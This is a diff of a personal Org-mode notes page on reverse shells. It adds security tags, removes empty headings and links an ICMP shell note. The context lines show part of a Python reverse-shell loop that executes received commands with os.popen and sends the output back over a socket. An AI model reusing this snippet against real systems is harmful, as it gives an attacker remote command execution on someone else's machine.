@@ -1,8 +1,7 @@
-#+TAGS:
+#+TAGS: sec shell
 
 
-* Reverse Shells
-* Description
+* Reverse Shells                                                  :sec:shell:
 * Python
 - too place inline python -c "<code_block>"
 #+BEGIN_SRC py
@@ -16,7 +15,7 @@ while True:
     out = os.popen(cmd).read()
     sock.send(out)"
 #+END_SRC
-* Lecture
-* Tutorial
-* Books
+* ICMP Shell
+- [[file://home/crito/org/tech/security/security_tools/icmpsh.org][icmpsh]]
+
 * Links
